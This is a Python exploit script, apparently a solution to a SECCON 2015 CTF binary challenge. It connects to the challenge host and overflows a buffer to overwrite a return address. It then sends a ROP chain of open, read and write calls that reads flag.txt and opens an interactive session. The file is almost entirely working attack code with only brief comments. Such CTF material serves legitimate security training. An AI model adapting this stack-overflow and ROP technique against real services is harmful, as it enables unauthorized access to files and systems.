#!/usr/bin/env python
import struct,socket,telnetlib
import time
# seccon 2015 ctf
# Exploit 500 SYSCALL: Impossible

# 1.rewrite the return address of read function to bypass pin protection
# 2.open,read,write rop chain or shellcode

def shell():
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def p(addr):
	return struct.pack("<Q",addr)

def p4(addr):
	return struct.pack("<I",addr)

def read_until(token):
	data = ""
	while not data.endswith(token):
		data += f.read(1)
	return data

s = socket.create_connection(("pinhole.pwn.seccon.jp",10000))
#s = socket.create_connection(("127.0.0.1",12345))
f = s.makefile('rw',bufsize=0)


payload = ""
payload = payload.ljust(268,"A")
# - 305
payload += p4(0xFFFFFECF) # index
payload += p(0x90919293) # rbp
payload += p(0x41424344) # ret

# 268 + 4 + 16 + 1 = 289
f.write(payload + "\n")

time.sleep(1)

open_plt = 0x4310b0
read_plt = 0x431110
write_plt = 0x431170
data = 0x6b5d00

pop_rdi = 0x4015fb
pop_rsi = 0x401717
pop_rdx = 0x432b15

# read(0,data,0x100)
egg = "A" * 8 + p(pop_rdi) + p(0) + p(pop_rsi) + p(data) + p(pop_rdx) + p(0x100)
egg += p(read_plt) 

# open(flag.txt,0)
egg += p(pop_rdi) + p(data) + p(pop_rsi) + p(0) + p(open_plt)

# read(fd,buf,0x100)
egg += p(pop_rdi) + p(3) + p(pop_rsi) + p(data+0x20) + p(pop_rdx) + p(0x100)
egg += p(read_plt)

# write(fd,buf,0x100)
egg += p(pop_rdi) + p(1) + p(pop_rsi) + p(data+0x20) + p(pop_rdx) + p(0x100)
egg += p(write_plt)
egg += p(0x90909090)

f.write(egg + "\n")
time.sleep(1)
f.write("flag.txt\x00" + "\n")

shell()

